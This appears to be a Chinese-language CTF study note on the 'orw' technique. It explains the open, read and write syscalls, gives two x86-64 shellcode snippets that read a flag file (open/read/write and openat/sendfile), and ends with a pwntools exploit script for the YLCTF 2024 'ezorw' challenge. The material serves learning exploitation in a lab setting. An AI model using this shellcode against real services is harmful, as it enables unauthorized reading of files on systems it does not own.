---
title: orw
date: '2025-02-24 23:14:42'
updated: '2025-06-07 19:17:22'
---
1. <font style="background-color:#FBDE28;">open 函数</font>

open 函数用于打开一个文件，并返回一个文件描述符（一个整数），该文件描述符用来在后续的文件操作中标识文件。函数原型如下：

`int open(const char *pathname, int flags, mode_t mode);`

参数：

+ pathname：

类型：const char *

描述：指定要打开的文件的路径。可以是绝对路径或相对路径。

例子："/path/to/file" 或 "file.txt"

+ flags：

类型：int

描述：文件访问模式标志，指定文件如何被打开。常见的 flags 有：

O_RDONLY：只读模式

O_WRONLY：只写模式

O_RDWR：读写模式

O_CREAT：如果文件不存在，则创建该文件

O_EXCL：如果文件已存在，O_CREAT 将失败

O_TRUNC：如果文件已经存在，打开时将其内容清空

O_APPEND：写操作会从文件末尾开始追加

还有更多其他标志，具体可以参考 fcntl.h 头文件中的定义。

例子：

O_RDONLY：只读模式打开文件。

O_WRONLY | O_CREAT | O_TRUNC：以写入模式打开文件，并且如果文件不存在则创建，且打开时清空文件内容。

+ mode：

类型：mode_t

描述：<font style="background-color:#FBDE28;">如果文件需要创建（O_CREAT 标志），则指定新文件的权限</font>。这是一个三位八进制数，表示文件的访问权限。例如，0644 表示用户可读写，其他用户只能读。

例子：0666（文件所有者可以读写，其他用户可以读）。

返回值：

成功时，返回一个非负整数（文件描述符）。

失败时，返回 -1，并设置 errno 以表示错误原因。

2. <font style="background-color:#FBDE28;">read 函数</font>

read 用于从文件中读取数据。函数原型如下：

`ssize_t read(int fd, void *buf, size_t count);`

参数：

+ fd：

类型：int

描述：文件描述符

+ buf：

类型：void *

描述：指向存储读取数据的缓冲区的指针。

+ count：

类型：size_t

描述：要读取的字节数。read 会尝试读取最多 count 字节的数据。

返回值：

返回实际读取的字节数。可能少于 count，例如，文件到达末尾时。

返回 0 表示已到达文件末尾（EOF）。

失败时，返回 -1，并设置 errno。

3. <font style="background-color:#FBDE28;">write 函数</font>

write 用于向文件中写入数据。函数原型如下：

ssize_t write(int fd, const void *buf, size_t count);

参数：

+ fd：

类型：int

描述：文件描述符，指定要写入的文件。这个文件描述符通常是通过 open 获得的。

例子：fd = open("file.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);

+ buf：

类型：const void *

描述：指向要写入数据的缓冲区的指针。write 将从这个缓冲区读取数据并写入到文件。

+ count：

类型：size_t

描述：要写入的字节数。write 会从缓冲区中读取最多 count 字节的数据并将它们写入文件。

返回值：

返回实际写入的字节数，可能小于 count。如果发生错误，则返回 -1，并设置 errno。

## ROP 型


## shellcode 型
标准 orw：

```python
shellcode=asm('''
    push 0x67616c66
    mov rdi,rsp
    xor rsi,rsi
    push 2
    pop rax
    syscall
              
    mov rdi,rax
    mov rsi,rsp
    mov rdx,0x100
    xor rax,rax
    syscall
              
    mov rdi,1
    mov rsi,rsp
    mov rax,1
    syscall
''')
```

open 和 sendfile 的 shellcode：

```python
shellcode=asm('''
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall
        
    mov rdi, 1
    mov rsi, 3
    push 0
    mov rdx, rsp
    mov r10, 0x100
    push SYS_sendfile
    pop rax
    syscall
''')
```

## YLCTF 2024 ezorw
非常简单的直接可以输入 shellcode 进行 orw

exp：

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# link=remote("challenge.yuanloo.com",34307)
link=process("./ezorw")

gdb.attach(link,'b *0x40129D')

shellcode=asm('''
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall
        
    mov rdi, 1
    mov rsi, 3
    push 0
    mov rdx, rsp
    mov r10, 0x100
    push SYS_sendfile
    pop rax
    syscall
''')

payload=shellcode
link.recvuntil("welcome to YLCTF orw~\n")
link.send(payload)

link.interactive()
```

